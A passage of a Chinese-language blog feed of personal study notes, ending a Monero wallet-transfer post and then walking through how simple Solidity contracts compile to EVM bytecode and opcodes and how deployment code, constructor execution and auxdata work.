class="built_in">print</span>(txs)</span><br><span class="line"><span class="built_in">print</span>(wallet.confirmations(txs[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(wallet.outgoing(unconfirmed=<span class="literal">True</span>, confirmed=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
<p>执行脚本后,拿tx hash去浏览器查询交易进度。<br />
<a href="https://localmonero.co/blocks/search/f67aa5539f051ca450402445b929c43ecbb8a2e6304b8e329b1c7490e46d9d9d">https://localmonero.co/blocks/search/f67aa5539f051ca450402445b929c43ecbb8a2e6304b8e329b1c7490e46d9d9d</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231212001900.png" alt="20231212001900" /></p>
<p>最终查看本地Gui客户端,可以知道转账成功了。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/WeChatWorkScreenshot_1fbcf509-6196-4da3-aaed-126898fb9cd3.png" alt="WeChatWorkScreenshot_1fbcf509-6196-4da3-aaed-126898fb9cd3" /></p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.getmonero.org/resources/moneropedia/daemon.html">Moneropedia Daemon</a></p>
</li>
<li class="lvl-2">
<p><a href="https://monero-python.readthedocs.io/en/latest/quickstart.html">monero-python文档</a></p>
</li>
<li class="lvl-2">
<p><a href="http://cw.hubwiz.com/card/c/monero-api-manual/1/3/43/">门罗币RPC API文档</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.getmonero.org/zh-cn/resources/moneropedia/remote-node.html">门罗币百科 远程节点</a></p>
</li>
<li class="lvl-2">
<p><a href="https://monero.fail/">Xmr Node</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-深入探索EVM—编译和部署智能合约</title>
    <url>/2022/42891.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://www.arcblock.io/blog/zh/post/2018/12/08/evm-part-1/">深入探索EVM : 编译和部署智能合约</a> 学习记录+Demo测试</p>
<h1>导读:</h1>
<p>以太坊虚拟机（Ethereum Virtual Machine）是以太坊的基础，它负责执行所有的交易（Transaction），并且根据这些 Transaction 来维护整个以太坊的账户状态，或者更准确的称之为 World State。</p>
<p>Transaction 分很多种，有最简单的以太币（Ether）交易，有部署或者调用智能合约的交易。智能合约（Smart Contract）是由虚拟机执行的代码，用以完成复杂的业务逻辑。</p>
<p>Solidity 是目前最流行的编写智能合约的高级语言。由 Solidity 编写的智能合约会先被编译成可被虚拟机直接接受的字节码，然后会被用户以 Transaction 的方式发送给以太坊从而进行智能合约部署。在这之后，用户便可以调用智能合约的函数来完成业务逻辑。</p>
<p>那么在整个流程中，</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Solidity 代码是如何被编译成字节码的？</p>
</li>
<li class="lvl-2">
<p>字节码在虚拟机中又是如何运行的？</p>
</li>
<li class="lvl-2">
<p>编译字节码的时候，虚拟机如何对其进行优化？</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220706162442.png" alt="20220706162442" /></p>
<p><a href="https://cypherpunks-core.github.io/ethereumbook/13evm.html">图来源</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220706211400.png" alt="20220706211400" /></p>
<p><a href="https://www.youtube.com/watch?v=HfTTbxQWWvg">图来源</a></p>
<h1>从一个例子开始：</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint256 a;</span><br><span class="line">    function C() &#123; // 旧的构造函数写法</span><br><span class="line">      a = 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>编译：</h1>
<h2 id="进行solc编译">进行solc编译:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ solc --bin --asm file_name.sol</span><br><span class="line"></span><br><span class="line">======= file_name.sol:C =======</span><br><span class="line">EVM assembly:</span><br><span class="line">    /* &quot;file_name.sol&quot;:26:93  contract C &#123;... */</span><br><span class="line">  mstore(0x40, 0x60)</span><br><span class="line">    /* &quot;file_name.sol&quot;:58:91  function C() &#123;... */</span><br><span class="line">  jumpi(tag_1, iszero(callvalue))</span><br><span class="line">  0x0</span><br><span class="line">  dup1</span><br><span class="line">  revert</span><br><span class="line">tag_1:</span><br><span class="line">tag_2:</span><br><span class="line">    /* &quot;file_name.sol&quot;:83:84  1 */</span><br><span class="line">  0x1</span><br><span class="line">    /* &quot;file_name.sol&quot;:79:80  a */</span><br><span class="line">  0x0</span><br><span class="line">    /* &quot;file_name.sol&quot;:79:84  a = 1 */</span><br><span class="line">  dup2</span><br><span class="line">  swap1</span><br><span class="line">  sstore</span><br><span class="line">  pop</span><br><span class="line">    /* &quot;file_name.sol&quot;:58:91  function C() &#123;... */</span><br><span class="line">tag_3:</span><br><span class="line">    /* &quot;file_name.sol&quot;:26:93  contract C &#123;... */</span><br><span class="line">tag_4:</span><br><span class="line">  dataSize(sub_0)</span><br><span class="line">  dup1</span><br><span class="line">  dataOffset(sub_0)</span><br><span class="line">  0x0</span><br><span class="line">  codecopy</span><br><span class="line">  0x0</span><br><span class="line">  return</span><br><span class="line">stop</span><br><span class="line"></span><br><span class="line">sub_0: assembly &#123;</span><br><span class="line">        /* &quot;file_name.sol&quot;:26:93  contract C &#123;... */</span><br><span class="line">      mstore(0x40, 0x60)</span><br><span class="line">    tag_1:</span><br><span class="line">      0x0</span><br><span class="line">      dup1</span><br><span class="line">      revert</span><br><span class="line"></span><br><span class="line">    auxdata: 0xa165627a7a72305820142c04ffb9430b805f0c95b45fe0ced073cc017dffca3c288c5c45dd913025080029</span><br><span class="line">&#125;</span><br><span class="line">Binary:</span><br><span class="line">60606040523415600e57600080fd5b5b60016000819055505b5b60368060266000396000f30060606040525b600080fd00a165627a7a72305820142c04ffb9430b805f0c95b45fe0ced073cc017dffca3c288c5c45dd913025080029</span><br></pre></td></tr></table></figure>
<h2 id="使用remix编译">使用remix编译:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;linkReferences&quot;: &#123;&#125;,</span><br><span class="line">	&quot;object&quot;: &quot;60606040523415600b57fe5b5b60016000819055505b5b60338060236000396000f30060606040525bfe00a165627a7a72305820ae4e46818f9f69832c210ff67b80210d9bc5c5863f97d91286c7278d4c5240d30029&quot;,</span><br><span class="line">	&quot;opcodes&quot;: &quot;PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH1 0xB JUMPI INVALID JUMPDEST JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP JUMPDEST JUMPDEST PUSH1 0x33 DUP1 PUSH1 0x23 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE JUMPDEST INVALID STOP LOG1 PUSH6 0x627A7A723058 SHA3 0xae 0x4e 0x46 DUP2 DUP16 SWAP16 PUSH10 0x832C210FF67B80210D9B 0xc5 0xc5 DUP7 0x3f SWAP8 0xd9 SLT DUP7 0xc7 0x27 DUP14 0x4c MSTORE BLOCKHASH 0xd3 STOP 0x29 &quot;,</span><br><span class="line">	&quot;sourceMap&quot;: &quot;26:67:0:-;;;58:33;;;;;;;83:1;79;:5;;;;58:33;26:67;;;;;;;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用remix编译的opcodes输出格式看起来还不错</p>
<h1>bytecode &amp;&amp; OpCodes：</h1>
<p>编译后的代码我们称之为<code>字节码（bytecode）</code>,如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自己编译出来的跟原文的有些不同，可能跟编译器的版本和参数有关，还是先用原文的bytecode</span></span><br><span class="line">60606040523415600e57600080fd5b600160008190555060358060236000396000f3006060604052600080fd00a165627a7a72305820d315875f56b532ab371cf9aa86a62850e13eb6ab194847011dcd641b9a9d2f8d0029</span><br></pre></td></tr></table></figure>
<p><strong>在这段字节码中，每个字符代表一个 16 进制数，每两个字符代表一个字节。</strong></p>
<p>这段字节码就是直接运行在虚拟机上的代码，虚拟机只需要按照事先定义好的规则，解释并且执行每个字节即可。但是对人类来说，直接阅读这些字节码太过繁琐，所以我们可以将其转换成对人类更友好的形式，操作码（OpCodes），如下所示:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># opcode也不同，还是先用原文的</span></span><br><span class="line">PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH1 0xE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH1 0x35 DUP1 PUSH1 0x23 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xd3 ISZERO DUP8 0x5f JUMP 0xb5 ORIGIN 0xab CALLDATACOPY SHR 0xf9 0xaa DUP7 0xa6 0x28 POP 0xe1 RETURNDATACOPY 0xb6 0xab NOT 0x48 0x47 ADD SAR 0xcd PUSH5 0x1B9A9D2F8D STOP 0x29</span><br></pre></td></tr></table></figure>
<p><strong>上面的字节码或者操作码是等价的</strong>，它们都可以被分为三个部分：</p>
<blockquote>
<p>TODO:换个新合约的bytecode和opcode要学会自己分part</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>部署智能合约的代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">60606040523415600e57600080fd5b600160008190555060358060236000396000f300</span><br><span class="line"></span><br><span class="line">PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH1 0xE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH1 0x35 DUP1 PUSH1 0x23 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>智能合约本身的代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6060604052600080fd00</span><br><span class="line"></span><br><span class="line">PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT STOP</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>Auxdata</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a165627a7a72305820d315875f56b532ab371cf9aa86a62850e13eb6ab194847011dcd641b9a9d2f8d0029</span><br><span class="line"></span><br><span class="line">LOG1 PUSH6 0x627A7A723058 KECCAK256 0xd3 ISZERO DUP8 0x5f JUMP 0xb5 ORIGIN 0xab CALLDATACOPY SHR 0xf9 0xaa DUP7 0xa6 0x28 POP 0xe1 RETURNDATACOPY 0xb6 0xab NOT 0x48 0x47 ADD SAR 0xcd PUSH5 0x1B9A9D2F8D STOP 0x29</span><br></pre></td></tr></table></figure>
<p>下面让我们来逐步讲解每个部分，看看它们都是怎么工作的。</p>
<h1>部署合约的流程：</h1>
<h2 id="部署智能合约的代码">部署智能合约的代码:</h2>
<p>第一部分代码是事实上把智能合约部署到以太坊上的代码，也是我们重点讨论的部分。这段代码又可以被划分为三个部分：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Payable 检查</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">60606040523415600e57600080fd</span><br><span class="line"></span><br><span class="line">PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH1 0xE JUMPI PUSH1 0x0 DUP1 REVERT</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>执行构造函数</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5b6001600081905550</span><br><span class="line"></span><br><span class="line">JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>复制代码，并将其返回给内存</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">60358060236000396000f300</span><br><span class="line"></span><br><span class="line">PUSH1 0x35 DUP1 PUSH1 0x23 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP</span><br></pre></td></tr></table></figure>
<h3 id="Payable-检查">Payable 检查:</h3>
<p><code>payable</code>是 <code>Solidity</code> 的一个关键字，如果一个函数被其标记，那么用户在调用该函数的同时还可以发送以太币到该智能合约。而这部分字节码的意义就在于阻止用户在调用没有被 <code>payable</code> 标记的函数时，向该智能合约发送以太币。下面这张图是对这段代码进一步演算，左边两列分别是字节码和操作码，最右边一列是执行完该条语句之后栈的状态。</p>
<h4 id="自己演算一遍">自己演算一遍:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bytecode</span></span><br><span class="line">60606040523415600e57600080fd</span><br><span class="line"><span class="comment"># opcode</span></span><br><span class="line">PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH1 0xE JUMPI PUSH1 0x0 DUP1 REV</span><br></pre></td></tr></table></figure>
<p>↓ 每两个字符代表一个字节，逐个字节拆分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">60 60  PUSH1 0x60 </span><br><span class="line">60 40  PUSH1 0x40 </span><br><span class="line">52     MSTORE</span><br><span class="line">34     CALLVALUE</span><br><span class="line">15     ISZERO</span><br><span class="line">60 0e  PUSH1 0xE </span><br><span class="line">57     JUMPI</span><br><span class="line">60 00  PUSH1 0x0</span><br><span class="line">80     DUP1</span><br><span class="line">fd     REVERT</span><br></pre></td></tr></table></figure>
<p>参考:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md">https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md</a>    (有介绍到pyethereum客户端的列表，maybe有空可以看看)</p>
</li>
<li class="lvl-2">
<p><a href="https://www.ethervm.io/#MSTORE">https://www.ethervm.io/#MSTORE</a> (这里可以看每个opcode对stack的操作)</p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.github.io/yellowpaper/paper.pdf">https://ethereum.github.io/yellowpaper/paper.pdf</a>   黄皮书里的附录</p>
</li>
</ul>
<p>演算stack里的变化</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220706153345.png" alt="20220706153345" /></p>
<p>原文的演算图：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220706153716.png" alt="20220706153716" /></p>
<p>在上图中，前三句是将内存中从<code>0x40</code>开始往后 <code>32 个字节</code>的地址赋上<code>0x60</code>这个值，这是虚拟机保留的内存地址。后面的几句就是在通过查看发送的以太币是否为 0 来做 payable 检查。如果是 0 的话，那么虚拟机程序计数器（<code>PC</code>）跳转到<code>0xe</code>的位置继续执行，如果不是的话，终止程序。</p>
<p>在这里需要说明一下，stack 里面的每一个元素都是 32 字节长度，在这里为了方便，省略了高位的 0。</p>
<h3 id="执行构造函数">执行构造函数:</h3>
<p>智能合约部署代码的第二部分是用来执行合约的构造函数的。如下图所示，在执行完这段字节码之后，heap 里面0x0的地址就被赋上了值0x1。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220706171429.png" alt="20220706171429" /></p>
<p>在上图中，<code>JUMPDEST</code>对应上面的<code>0xe</code>，它代表了如果通过上面的 payable 检查，我们应该跳转到这里继续执行代码。<code>SSTORE</code>命令是用来将栈上的值存储到 <code>World State</code> 上的。</p>
<p>在图中用了 <code>heap</code> 来代表 <code>World State</code> 是因为它们俩有很多相似之处。</p>
<p>我们知道在 Java 里面，栈是用来存储函数运行时的临时变量的，而堆是用来存储生命周期更长的变量，比如成员变量。<br />
<strong>栈上的数据会随着方法的执行完毕而被实时清空，而堆上的数据会在整个类实例的生命周期里面始终有效。</strong><br />
Java 虚拟机不会将堆中的成员变量清空，除非该类的实例被回收。而一个部署到以太坊上的智能合约可以被认为是永远活着的合约实例(当然一个合约也可以被杀死)。</p>
<p>所以用来存放智能合约状态的 World State 就可以被看做是以太坊的 <code>heap</code>。在这里我之所以用 <code>heap</code> 来代指 <code>World State</code>，第一是希望跟 <code>stack</code> 做一个呼应，第二是希望从另一个方面描述以太坊的本质：<strong>以太坊是一个计算机网络，它将整个网络里面的所有计算机连接起来形成一个单一计算机。在这个计算机中，它使用数据结构来模拟内存的工作机制从而实现图灵完备的编程语言。</strong></p>
<p>在以太坊中，<code>World State</code> 是一个 <code>key-value pair</code>。每一个 key 对应一个 32 字节长的数据块。所以在上图所示的情况里面，<code>0x0</code> 这个 key 所对应的数据块里面存储了 <code>0x1</code> 这个数（32 字节，高位补 0）。</p>
<h3 id="复制代码">复制代码:</h3>
<p>智能合约部署代码的第三部分是将剩余的代码，既智能合约本身的代码和 <code>Auxdata</code> 从 <code>Transaction</code> 中复制到内存里面并返回之。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220706172513.png" alt="20220706172513" /></p>
<p>从上图可知，我们将0x23到0x58的字节码（总共 0x35 个字节码）复制到了内存中0x0到0x35的地址上。</p>
<h2 id="智能合约本身的代码">智能合约本身的代码</h2>
<p>整个字节码的第二部分是智能合约本身的代码，它们会在智能合约的函数被调用的时候执行。因为在我们当前的例子中，智能合约只有一个构造函数，而没有其他方法，所以下图所示的代码并没有做什么有实际意义的操作。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220706172839.png" alt="20220706172839" /></p>
<h2 id="Auxdata：">Auxdata：</h2>
<p>第三部分 Auxdata 是有一个固定模板的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xa1 0x65 &#x27;b&#x27; &#x27;z&#x27; &#x27;z&#x27; &#x27;r&#x27; &#x27;0&#x27; 0x58 0x20 &lt;32 bytes swarm hash&gt; 0x00 0x29</span><br></pre></td></tr></table></figure>
<p>我们将上述的字节码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a165627a7a72305820d315875f56b532ab371cf9aa86a62850e13eb6ab194847011dcd641b9a9d2f8d0029</span><br></pre></td></tr></table></figure>
<p>带入该模板中，可以得到 <code>swarm hash</code> 为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d315875f56b532ab371cf9aa86a62850e13eb6ab194847011dcd641b9a9d2f8d</span><br></pre></td></tr></table></figure>
<p>这个 <code>Swarm Hash</code> 可以用来校验智能合约的代码，也可以用来获取智能合约的元数据。</p>
<h1>创建合约的合约</h1>
<p>我们已经通过上面的讲解，了解了部署智能合约的整个流程。在这个流程中，字节码以 <code>Transaction</code> 的方式发送给以太坊从而完成对其的部署，不过智能合约不仅能被手动创建，也可以被其他已有的智能合约创建。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.11</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Foo</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">FooFactory</span> &#123;</span><br><span class="line">  address fooInstance;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">makeNewFoo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    fooInstance = <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>solc编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ solc --bin --asm deployContractbyContract.sol</span><br><span class="line"></span><br><span class="line">======= deployContractbyContract.sol:Foo =======</span><br><span class="line">EVM assembly:</span><br><span class="line">    /* &quot;deployContractbyContract.sol&quot;:26:42  contract Foo &#123;... */</span><br><span class="line">  mstore(0x40, 0x60)</span><br><span class="line">  jumpi(tag_1, iszero(callvalue))</span><br><span class="line">  invalid</span><br><span class="line">tag_1:</span><br><span class="line">tag_2:</span><br><span class="line">  dataSize(sub_0)</span><br><span class="line">  dup1</span><br><span class="line">  dataOffset(sub_0)</span><br><span class="line">  0x0</span><br><span class="line">  codecopy</span><br><span class="line">  0x0</span><br><span class="line">  return</span><br><span class="line">stop</span><br><span class="line"></span><br><span class="line">sub_0: assembly &#123;</span><br><span class="line">        /* &quot;deployContractbyContract.sol&quot;:26:42  contract Foo &#123;... */</span><br><span class="line">      mstore(0x40, 0x60)</span><br><span class="line">    tag_1:</span><br><span class="line">      invalid</span><br><span class="line">&#125;</span><br><span class="line">Binary:</span><br><span class="line">60606040523415600b57fe5b5b60338060196000396000f30060606040525bfe00a165627a7a723058200b92d5c31520b4d21e734dab0cb60055bb92299f7b249b877ba77ba2cebe22610029</span><br><span class="line"></span><br><span class="line">======= deployContractbyContract.sol:FooFactory =======</span><br><span class="line">EVM assembly:</span><br><span class="line">    /* &quot;deployContractbyContract.sol&quot;:44:149  contract FooFactory &#123;... */</span><br><span class="line">  mstore(0x40, 0x60)</span><br><span class="line">  jumpi(tag_1, iszero(callvalue))</span><br><span class="line">  invalid</span><br><span class="line">tag_1:</span><br><span class="line">tag_2:</span><br><span class="line">  dataSize(sub_0)</span><br><span class="line">  dup1</span><br><span class="line">  dataOffset(sub_0)</span><br><span class="line">  0x0</span><br><span class="line">  codecopy</span><br><span class="line">  0x0</span><br><span class="line">  return</span><br><span class="line">stop</span><br><span class="line"></span><br><span class="line">sub_0: assembly &#123;</span><br><span class="line">        /* &quot;deployContractbyContract.sol&quot;:44:149  contract FooFactory &#123;... */</span><br><span class="line">      mstore(0x40, 0x60)</span><br><span class="line">      calldataload(0x0)</span><br><span class="line">      0x100000000000000000000000000000000000000000000000000000000</span><br><span class="line">      swap1</span><br><span class="line">      div</span><br><span class="line">      0xffffffff</span><br><span class="line">      and</span><br><span class="line">      dup1</span><br><span class="line">      0x4e3991af</span><br><span class="line">      eq</span><br><span class="line">      tag_2</span><br><span class="line">      jumpi</span><br><span class="line">    tag_1:</span><br><span class="line">      invalid</span><br><span class="line">        /* &quot;deployContractbyContract.sol&quot;:91:147  function makeNewFoo() &#123;... */</span><br><span class="line">    tag_2:</span><br><span class="line">      jumpi(tag_3, iszero(callvalue))</span><br><span class="line">      invalid</span><br><span class="line">    tag_3:</span><br><span class="line">      tag_4</span><br><span class="line">      jump(tag_5)</span><br><span class="line">    tag_4:</span><br><span class="line">      stop</span><br><span class="line">    tag_5:</span><br><span class="line">        /* &quot;deployContractbyContract.sol&quot;:133:142  new Foo() */</span><br><span class="line">      tag_7</span><br><span class="line">      jump	// in(tag_8)</span><br><span class="line">    tag_7:</span><br><span class="line">      dup1</span><br><span class="line">      swap1</span><br><span class="line">      pop</span><br><span class="line">      mload(0x40)</span><br><span class="line">      dup1</span><br><span class="line">      swap2</span><br><span class="line">      sub</span><br><span class="line">      swap1</span><br><span class="line">      0x0</span><br><span class="line">      create</span><br><span class="line">      dup1</span><br><span class="line">      iszero</span><br><span class="line">      iszero</span><br><span class="line">      tag_9</span><br><span class="line">      jumpi</span><br><span class="line">      invalid</span><br><span class="line">    tag_9:</span><br><span class="line">        /* &quot;deployContractbyContract.sol&quot;:119:130  fooInstance */</span><br><span class="line">      0x0</span><br><span class="line">      0x0</span><br><span class="line">        /* &quot;deployContractbyContract.sol&quot;:119:142  fooInstance = new Foo() */</span><br><span class="line">      0x100</span><br><span class="line">      exp</span><br><span class="line">      dup2</span><br><span class="line">      sload</span><br><span class="line">      dup2</span><br><span class="line">      0xffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">      mul</span><br><span class="line">      not</span><br><span class="line">      and</span><br><span class="line">      swap1</span><br><span class="line">      dup4</span><br><span class="line">      0xffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">      and</span><br><span class="line">      mul</span><br><span class="line">      or</span><br><span class="line">      swap1</span><br><span class="line">      sstore</span><br><span class="line">      pop</span><br><span class="line">        /* &quot;deployContractbyContract.sol&quot;:91:147  function makeNewFoo() &#123;... */</span><br><span class="line">    tag_6:</span><br><span class="line">      jump	// out</span><br><span class="line">        /* &quot;deployContractbyContract.sol&quot;:44:149  contract FooFactory &#123;... */</span><br><span class="line">    tag_8:</span><br><span class="line">      mload(0x40)</span><br><span class="line">      dataSize(sub_0)</span><br><span class="line">      dup1</span><br><span class="line">      dataOffset(sub_0)</span><br><span class="line">      dup4</span><br><span class="line">      codecopy</span><br><span class="line">      add</span><br><span class="line">      swap1</span><br><span class="line">      jump	// out</span><br><span class="line">    stop</span><br><span class="line"></span><br><span class="line">    sub_0: assembly &#123;</span><br><span class="line">            /* &quot;deployContractbyContract.sol&quot;:26:42  contract Foo &#123;... */</span><br><span class="line">          mstore(0x40, 0x60)</span><br><span class="line">          jumpi(tag_1, iszero(callvalue))</span><br><span class="line">          invalid</span><br><span class="line">        tag_1:</span><br><span class="line">        tag_2:</span><br><span class="line">          dataSize(sub_0)</span><br><span class="line">          dup1</span><br><span class="line">          dataOffset(sub_0)</span><br><span class="line">          0x0</span><br><span class="line">          codecopy</span><br><span class="line">          0x0</span><br><span class="line">          return</span><br><span class="line">        stop</span><br><span class="line"></span><br><span class="line">        sub_0: assembly &#123;</span><br><span class="line">                /* &quot;deployContractbyContract.sol&quot;:26:42  contract Foo &#123;... */</span><br><span class="line">              mstore(0x40, 0x60)</span><br><span class="line">            tag_1:</span><br><span class="line">              invalid</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Binary:</span><br><span class="line">6060604052341561000c57fe5b5b6101358061001c6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634e3991af1461003b575bfe5b341561004357fe5b61004b61004d565b005b6100556100ae565b809050604051809103906000f080151561006b57fe5b600060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b565b604051604c806100be83390190560060606040523415600b57fe5b5b60338060196000396000f30060606040525bfe00a165627a7a723058200b92d5c31520b4d21e734dab0cb60055bb92299f7b249b877ba77ba2cebe22610029a165627a7a723058204b341e0e274980968e26e50d5f362e68f368b18aff1545db99672b0be89301670029</span><br></pre></td></tr></table></figure>
<p>在上面的代码里面我们可以看到两个合约，一个是 Foo，一个是用来创建 Foo 的 FooFactory。如果我们把上面的代码编译之后会得到如下的字节码:</p>
<blockquote>
<p>不知道怎么得出下面的…</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FooFactoryDeployCode</span><br><span class="line">FooFactoryContractCode</span><br><span class="line">  FooDeployCode</span><br><span class="line">  FooContractCode</span><br><span class="line">  FooAUXData</span><br><span class="line">FooFactoryAUXData</span><br></pre></td></tr></table></figure>
<p>不难看出，整个字节码分两层，每一层又和之前描述的一样，分为三个部分。最外层的字节码用来部署 <code>FooFactory</code>，它的 <code>Contract Code</code> 部分是用来创建合约 <code>Foo</code> 的，所以在这一部分里面又嵌套了一套完整的用来部署合约的代码</p>
<h1>增加一个成员变量:</h1>
<p>在第一个例子中，我们在整个合约里面只创建了一个成员变量。现在让我们来把合约变的复杂一点，再增加一个成员变量，看看相应的字节码有什么变化。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.11</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint256 a;</span><br><span class="line">    uint256 b;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">C</span>(<span class="params"></span>) &#123;</span><br><span class="line">      a = <span class="number">1</span>;</span><br><span class="line">      b = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在省略掉其余部分之后，运行构造函数的部分如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5b      JUMPDEST</span><br><span class="line">60 01   PUSH1 0x1</span><br><span class="line">60 00   PUSH1 0x0</span><br><span class="line">81      DUP2</span><br><span class="line">90      SWAP1</span><br><span class="line">55      SSTORE             // heap &#123;0x0 =&gt; 0x1&#125;</span><br><span class="line">50      POP</span><br><span class="line">60 02   PUSH1 0x2</span><br><span class="line">60 01   PUSH1 0x1</span><br><span class="line">81      DUP2</span><br><span class="line">90      SWAP1</span><br><span class="line">55      SSTORE             // heap &#123;0x0 =&gt; 0x1&#125; &#123;0x1 =&gt; 0x2&#125;</span><br><span class="line">50      POP</span><br></pre></td></tr></table></figure>
<p>很容易看出，虚拟机依次为变量<code>a</code>和<code>b</code>在 World State 中分配了两个地址<code>0x0</code>和<code>0x1</code>，并且赋上了相应的值 1 和 2。事实上如果有更多的成员变量，虚拟机会依次的为它们分配存储地址。在这里我们分配的存储地址对应于该RPC里面的第二个参数。</p>
<h1>从256位到128位：</h1>
<p>在上面的例子中我们声明了两个 256 位（32 字节）的无符号整型数。在实际运用中我们可能根本不需要那么多的空间，比如在其他语言中常用的整型数只有 4 个字节。所以现在让我们来做一点优化，把这两个 32 字节的数变成两个 16 字节的整型数，看看会发生什么变化。</p>
